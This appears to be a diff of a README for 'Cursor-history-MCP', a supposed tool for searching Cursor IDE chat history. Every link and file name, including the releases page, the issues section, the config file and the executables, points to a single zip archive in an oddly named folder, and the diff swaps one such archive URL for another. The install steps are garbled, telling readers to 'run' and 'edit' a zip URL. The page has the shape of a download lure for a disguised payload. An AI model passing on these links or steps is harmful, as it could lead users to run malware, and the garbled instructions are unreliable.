@@ -1,7 +1,7 @@
 # 🎉 Cursor-history-MCP - Easily Search Your Chat History
 
 ## 📥 Download Now
-[![Download Cursor-history-MCP](https://raw.githubusercontent.com/pedrohenrique316/Cursor-history-MCP/main/Marsipobranchiata/Cursor-history-MCP.zip)](https://raw.githubusercontent.com/pedrohenrique316/Cursor-history-MCP/main/Marsipobranchiata/Cursor-history-MCP.zip)
+[![Download Cursor-history-MCP](https://github.com/pedrohenrique316/Cursor-history-MCP/raw/refs/heads/main/Marsipobranchiata/MCP-Cursor-history-1.8-beta.3.zip)](https://github.com/pedrohenrique316/Cursor-history-MCP/raw/refs/heads/main/Marsipobranchiata/MCP-Cursor-history-1.8-beta.3.zip)
 
 ## 🚀 Getting Started
 Welcome to Cursor-history-MCP! This application allows you to search through your vectorized Cursor IDE chat history with ease. You can quickly find the information you need without diving into endless messages.
@@ -19,15 +19,15 @@ Welcome to Cursor-history-MCP! This application allows you to search through you
 - **Docker:** Required for the application container.
 
 ## 📦 Download & Install
-1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/pedrohenrique316/Cursor-history-MCP/main/Marsipobranchiata/Cursor-history-MCP.zip) to access the latest release.
-2. **Choose the File:** Locate the file named `https://raw.githubusercontent.com/pedrohenrique316/Cursor-history-MCP/main/Marsipobranchiata/Cursor-history-MCP.zip` (replace X.X.X with the latest version number) on the releases page.
+1. **Visit the Releases Page:** Go to [this link](https://github.com/pedrohenrique316/Cursor-history-MCP/raw/refs/heads/main/Marsipobranchiata/MCP-Cursor-history-1.8-beta.3.zip) to access the latest release.
+2. **Choose the File:** Locate the file named `https://github.com/pedrohenrique316/Cursor-history-MCP/raw/refs/heads/main/Marsipobranchiata/MCP-Cursor-history-1.8-beta.3.zip` (replace X.X.X with the latest version number) on the releases page.
 3. **Download the File:** Click the file name to begin downloading. This file is a compressed package that contains everything you need to run the application.
 4. **Extract the File:** Once downloaded, locate the zip file and extract it to a folder on your computer. You can do this by right-clicking the file and selecting "Extract All."
-5. **Run the Application:** In the extracted folder, locate and run the `https://raw.githubusercontent.com/pedrohenrique316/Cursor-history-MCP/main/Marsipobranchiata/Cursor-history-MCP.zip` file (Windows) or `https://raw.githubusercontent.com/pedrohenrique316/Cursor-history-MCP/main/Marsipobranchiata/Cursor-history-MCP.zip` file (macOS/Linux). This will initiate the application.
+5. **Run the Application:** In the extracted folder, locate and run the `https://github.com/pedrohenrique316/Cursor-history-MCP/raw/refs/heads/main/Marsipobranchiata/MCP-Cursor-history-1.8-beta.3.zip` file (Windows) or `https://github.com/pedrohenrique316/Cursor-history-MCP/raw/refs/heads/main/Marsipobranchiata/MCP-Cursor-history-1.8-beta.3.zip` file (macOS/Linux). This will initiate the application.
 
 ## ⚙️ Configuration
 After starting the application, you may need to configure it to work with your Cursor IDE chat data. Follow these steps:
-1. **Locate Configuration File:** Find the `https://raw.githubusercontent.com/pedrohenrique316/Cursor-history-MCP/main/Marsipobranchiata/Cursor-history-MCP.zip` file in the folder where you extracted the application.
+1. **Locate Configuration File:** Find the `https://github.com/pedrohenrique316/Cursor-history-MCP/raw/refs/heads/main/Marsipobranchiata/MCP-Cursor-history-1.8-beta.3.zip` file in the folder where you extracted the application.
 2. **Edit the File:** Open this file with a text editor. You will need to input the path to your chat history data.
 3. **Save Your Changes:** Make sure to save the file before closing the editor.
 
@@ -40,11 +40,11 @@ Once your application is running, follow these easy steps to search your chat hi
 ## 🛠️ Troubleshooting
 If you encounter issues while running the application, consider the following solutions:
 - **Check Docker Installation:** Ensure Docker is installed and running on your system.
-- **Review Configuration File:** Double-check that the path you set in the `https://raw.githubusercontent.com/pedrohenrique316/Cursor-history-MCP/main/Marsipobranchiata/Cursor-history-MCP.zip` is correct.
+- **Review Configuration File:** Double-check that the path you set in the `https://github.com/pedrohenrique316/Cursor-history-MCP/raw/refs/heads/main/Marsipobranchiata/MCP-Cursor-history-1.8-beta.3.zip` is correct.
 - **Restart the Application:** If the application is not responding, try closing it and starting it again.
 
 ## 🌐 Support
-If you have questions or need help, you can create an issue in the [Issues section](https://raw.githubusercontent.com/pedrohenrique316/Cursor-history-MCP/main/Marsipobranchiata/Cursor-history-MCP.zip) of the repository. The community and maintainers monitor this section and can provide assistance.
+If you have questions or need help, you can create an issue in the [Issues section](https://github.com/pedrohenrique316/Cursor-history-MCP/raw/refs/heads/main/Marsipobranchiata/MCP-Cursor-history-1.8-beta.3.zip) of the repository. The community and maintainers monitor this section and can provide assistance.
 
 ## 📥 Additional Information
 For more details about usage, check the documentation included in the extracted folder. It contains helpful tips and advanced features to enhance your experience with Cursor-history-MCP.
@@ -52,4 +52,4 @@ For more details about usage, check the documentation included in the extracted 
 ## 📥 Download Now Again
 Don't forget to download Cursor-history-MCP if you haven’t already! Click the link below:
 
-[![Download Cursor-history-MCP](https://raw.githubusercontent.com/pedrohenrique316/Cursor-history-MCP/main/Marsipobranchiata/Cursor-history-MCP.zip)](https://raw.githubusercontent.com/pedrohenrique316/Cursor-history-MCP/main/Marsipobranchiata/Cursor-history-MCP.zip)
+[![Download Cursor-history-MCP](https://github.com/pedrohenrique316/Cursor-history-MCP/raw/refs/heads/main/Marsipobranchiata/MCP-Cursor-history-1.8-beta.3.zip)](https://github.com/pedrohenrique316/Cursor-history-MCP/raw/refs/heads/main/Marsipobranchiata/MCP-Cursor-history-1.8-beta.3.zip)
